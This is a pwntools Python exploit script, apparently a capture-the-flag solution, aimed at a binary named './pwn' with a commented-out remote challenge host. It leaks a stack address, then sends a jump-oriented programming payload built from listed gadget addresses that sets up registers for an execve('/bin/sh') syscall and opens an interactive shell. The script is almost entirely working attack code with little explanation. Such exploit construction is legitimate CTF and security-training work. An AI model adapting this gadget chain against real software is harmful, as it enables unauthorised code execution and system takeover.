from pwn import *

context(log_level="debug", arch="amd64", os="linux")
io = process("./pwn")
#io = remote("node1.tgctf.woooo.tech",31735)
elf = ELF("./pwn")


def dbg():
    gdb.attach(io)


eip_offset = 256

xchg_rax_rdi_jmp_rax_1 = 0x401000  # xchg rax, rdi; jmp qword ptr [rax + 1];
xor_rax_rax_jmp_rdx = 0x40100A  # xor rax, rax; jmp qword ptr [rdx];
pop_rsp_rdi_rcx_rdx_jmp_rdx_1 = (
    0x40100F  # pop rsp; pop rdi; pop rcx; pop rdx; jmp qword ptr [rdi + 1];
)
mov_rsi_rcx_jmp_rdx = 0x40101B  # mov rsi, qword ptr [rcx + 0x10]; jmp qword ptr [rdx];
pop_rdx_jmp_rcx = 0x401021  # pop rdx; jmp qword ptr [rcx];
add_rax_rdx_jmp_rcx = 0x401024  # add rax, rdx; jmp qword ptr [rcx];
pop_rcx_jmp_rdx = 0x401029  # pop rcx; jmp qword ptr [rdx];
syscall = 0x401163  # syscall;
ret = 0x401165  # add rsp, 0x8; jmp [rsp-0x8];

# Leak the stack base
io.sendlineafter("> ", "4")
rsp = u64(io.recvn(8)) - 0x100
log.success(f"rsp : {hex(rsp)}")

# Build dispatch table and setup initial dispatch registers
payload = b"/bin/sh\x00"  # [0x00] (rsp base)
payload += p64(ret)  # [0x08]
payload += p64(0x00)  # [0x10]

payload += p64(rsp + 8- 0x1)  # [0x18] (rdi)
payload += p64(rsp + 8)  # [0x20] (rcx)
payload += p64(rsp + 8)  # [0x28] (rdx)

# Set rdi = &'/bin/sh'                      (xor rax, rax; pop rdx; add rax, rdx; xchg rax, rdi; ret)
payload += p64(xor_rax_rax_jmp_rdx)  # [0x30]
payload += p64(pop_rdx_jmp_rcx)  # [0x38]
payload += p64(rsp)  # [0x40]
payload += p64(add_rax_rdx_jmp_rcx)  # [0x48]
payload += p64(xchg_rax_rdi_jmp_rax_1)  # [0x50]

# Reset rdx
payload += p64(pop_rdx_jmp_rcx)  # [0x58]
payload += p64(rsp + 8)  # [0x60]

# Set rsi = 0x00                            (pop rcx; mov rsi, [rcx+0x10]; ret)
payload += p64(pop_rcx_jmp_rdx)  # [0x68]
payload += p64(rsp + 0x10)  # [0x70]
payload += p64(mov_rsi_rcx_jmp_rdx)  # [0x78]

# Reset rcx
payload += p64(pop_rcx_jmp_rdx)  # [0x80]
payload += p64(rsp + 8)  # [0x88]

# Set rax = SYS_execve                      (xor rax, rax; pop rdx; add rax, rdx; ret)
payload += p64(xor_rax_rax_jmp_rdx)  # [0x90]
payload += p64(pop_rdx_jmp_rcx)  # [0x98]
payload += p64(0x3b)  # [0xa0]
payload += p64(add_rax_rdx_jmp_rcx)  # [0xa8]

# Set rdx = 0x00 & Pwn                      (pop rdx; syscall)
payload += p64(pop_rdx_jmp_rcx)  # [0xb0]
payload += p64(0x00)  # [0xb8]
payload += p64(syscall)  # [0xc0]

io.sendlineafter("> ", "2")
gdb.attach(io)
io.sendlineafter(
    ": ",
    flat(
        {0: payload, eip_offset: pop_rsp_rdi_rcx_rdx_jmp_rdx_1}, rsp + 0x8 * 3
    ),
)
io.recvline()
io.interactive()
